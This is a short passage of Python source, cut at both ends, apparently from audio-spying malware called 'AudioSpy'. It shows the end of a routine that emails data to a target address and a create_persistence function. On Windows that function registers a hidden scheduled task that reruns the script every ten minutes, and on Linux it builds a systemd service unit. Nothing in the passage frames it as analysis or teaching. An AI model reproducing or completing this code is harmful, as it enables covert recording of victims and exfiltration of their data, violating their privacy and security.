        server.sendmail(email_user, target_email, msg.as_string())
        server.quit()
    
    def create_persistence():
        if platform.system() == 'Windows':
            service_name = 'AudioSpyService'
            service_command = f'schtasks /create /tn {service_name} /tr "pythonw {__file__}" /sc minute /mo 10'
            subprocess.run(service_command, shell=True, check=True)
        elif platform.system() == 'Linux':
            service_name = 'audiospy'
            service_content = f'[Unit]\nDescription=Audio Spy Service\n[Service]\nExecStart=/usr/bin/python3 {__file__}\n[Install]\nWantedBy=multi-user.target'
